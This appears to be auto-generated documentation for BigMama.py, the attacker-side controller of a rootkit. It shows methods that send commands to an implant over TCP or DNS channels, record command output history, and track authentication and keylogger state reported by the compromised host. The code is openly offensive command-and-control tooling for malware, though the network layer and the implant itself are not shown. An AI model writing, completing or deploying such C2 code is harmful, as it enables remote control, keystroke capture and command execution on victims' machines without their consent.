Detailed Description

BigMama is the main controller for the attacker side of the rootkit.
It manages TCP connections, DNS communication, and command history.
It also tracks authentication status and keylogger state.

Definition at line 7 of file BigMama.py.

58 def _check_rootkit_command(self, message: str) -> None:
59 match message.strip():
60 case "User authenticated.":
61 self._authenticated = True
62 print("[AUTHENTICATION] Server authenticated successfully.")
63 case "User successfully disconnected.":
64 self._authenticated = False
65 print("[AUTHENTICATION] User disconnected.")
66 case "keylogger activated":
67 self._klg_on = True
68 print("[KLG] Keylogger activated.")
69 case "keylogger desactivated":
70 self._klg_on = False
71 print("[KLG] Keylogger desactivated.")

Definition at line 88 of file BigMama.py.

88 def _extract_outputs(self, message: str):
89 if all(k in message for k in ["stdout:\n", "stderr:\n", "Terminated with code"]):
90 stdout = message.split("stdout:\n")[-1].split("stderr:\n")[0].strip()
91 stderr = message.split("stderr:\n")[-1].split("Terminated with code")[0].strip()
92 termination_code = ''.join(filter(str.isdigit, message.split("Terminated with code")[-1]))
93 else:
94 stdout, stderr, termination_code = message, "", ""
95 return stdout, stderr, termination_code
96

73 def _update_command_history(self, command: str, reponse: str, tcp_error="") -> None:
74 stdout, stderr, termination_code = self._extract_outputs(reponse)
75
76 to_append = {
77 "command": command,
78 "stdout": stdout,
79 "stderr": stderr,
80 "termination_code": termination_code if termination_code else None,
81 "tcp_error": tcp_error if tcp_error else None
82 }
83
84 self._command_history.append(to_append)
85

◆ send()

Optional[str] send (   self,
str  command,
bool  use_history,
str  channel = "tcp" 
) 
Send `command` over the specified channel: "tcp" or "dns".
If `use_history` is True, store (command, stdout, stderr, termination_code) locally.
Returns the raw plaintext response, or None on timeout/failure.

Definition at line 30 of file BigMama.py.

30 def send(self, command: str, use_history: bool, channel: str="tcp") -> Optional[str]:
31 """
32 Send `command` over the specified channel: "tcp" or "dns".
33 If `use_history` is True, store (command, stdout, stderr, termination_code) locally.
34 Returns the raw plaintext response, or None on timeout/failure.
35 """
36
37 resp: Optional[str] = None
38
39 # Delegate to the chosen channel
40 if channel == "tcp":
41 if use_history: resp = self._tcp.send_to_client_with_history(command)
42 else: resp = self._tcp.send_to_client(command)
43
44 # If the TCP thread never got a client, resp may be None or False
45 if resp is None or resp is False:
46 print("[TCP SERVER] No client connected or failed to send command.")
47 resp = ""
48
49 # DNS channel always uses `use_history=True`
50 else:
51 resp = self._dns.send(command)
52 if resp is None:
53 print("[DNS SERVER] Failed to send command or no response received.")
54 resp = ""
55
56 return resp.strip()
57
